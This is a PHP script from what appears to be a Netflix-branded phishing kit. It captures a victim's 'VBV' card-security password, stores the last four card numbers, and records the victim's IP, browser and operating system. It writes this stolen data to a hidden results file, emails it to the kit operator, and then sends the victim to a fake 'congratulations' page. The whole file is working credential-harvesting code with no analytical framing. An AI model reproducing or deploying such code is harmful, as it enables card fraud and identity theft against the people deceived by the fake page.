<?php


session_start();
////// LAST 4 NUMBERS ////////
$_SESSION['cn'] = $_POST['cn'];
///// LAST 4 NUMBERS ////////
$TIME_DATE = date('H:i:s d/m/Y');
include('../../app/get_browser.php');
include('../../__CONFIG__.php');
include('../../app/get_ip.php');
$message .= "
<!DOCTYPE html>
            <html>
            <head>
                <meta charset='UTF-8' />
            </head>
            <body>
            <style type='text/css'>
            body{
                background: #141414;
                color: #fff;
                font-family: arial;
            }
            .rezlt{
                width: 600px;
            }
            table{
                width: 100%;
                background: #fff;
                color: #000;
            }
            table td{
                padding: 10px;
            }
            .newline{
                width: 100%;
                background: #141414;
                height: 2px;
            }
            </style>
            <center>
            <div class='rezlt'>
                <h3 style='text-align: center;background: #e50914;margin: 0px;padding: 17px;'>Netflix</h3>
                <table>
                    <tr>
                        <td style='width: 200px;'><b>❤ VBV POLYNESIE PASS ❤</b></td>
                        <td style='width: 400px;'>".$_POST['password']."</td>
                    </tr>
                    <tr>
                    </tr>
                </table>
                <div class='newline'></div>
                <table>
                    <tr>
                        
                    </tr>
                </table>
                <div class='newline'></div>
                <table>
                    <tr>
                        <td style='width: 200px;'><b>IP</b></td>
                        <td style='width: 400px;'><a href='http://geoiptool.com/?ip=".$remote."' target='_blank'>".$remote."</a></td>
                    </tr>
                    <tr>
                        <td style='width: 200px;'><b>Browser</b></td>
                         <td style='width: 400px;'>".DR_Browser($_SERVER['HTTP_USER_AGENT'])."</td>
                    </tr>
                    <tr>
                        <td style='width: 200px;'><b>Current Systeme</b></td>
                       <td style='width: 400px;'>".DR_OS($_SERVER['HTTP_USER_AGENT'])."</td>
                    </tr>
                </table>
            </div>
            </center>
            </body>
            </html>\n";



            $subject  = "NETFL!X [ ❤ VBV POLYNESIE PASS ❤ ] - [ ".$remote." ] - [ ".$_SESSION['_LOOKUP_COUNTRY_']." ] - ";
            $headers  = "From: NETFL!X <rezult@phinomen.com>\r\n";
            $headers .= "MIME-Version: 1.0\r\n";
            $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
            $txt_rezlt = fopen('../../_____________RZLT.htm', 'a');
            fwrite($txt_rezlt, $message);
            fclose($txt_rezlt);
            @mail($to, $subject, $message, $headers);

  
header("Location: ../../congratulations.php")
?>